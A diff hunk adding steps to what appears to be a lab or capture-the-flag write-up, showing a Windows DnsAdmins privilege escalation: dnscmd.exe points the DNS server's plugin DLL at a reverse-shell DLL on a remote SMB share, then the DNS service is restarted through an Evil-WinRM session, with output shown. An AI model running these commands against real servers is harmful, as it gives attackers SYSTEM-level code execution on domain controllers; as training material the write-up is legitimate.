@@ -307,6 +307,34 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Ill start an SMB server
 
 ```python
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.90\share\reverse.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+*Evil-WinRM* PS C:\Temp> sc.exe stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x7530
+*Evil-WinRM* PS C:\Temp> sc.exe start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2780
+        FLAGS              :
+*Evil-WinRM* PS C:\Temp> 
 
 ```
 
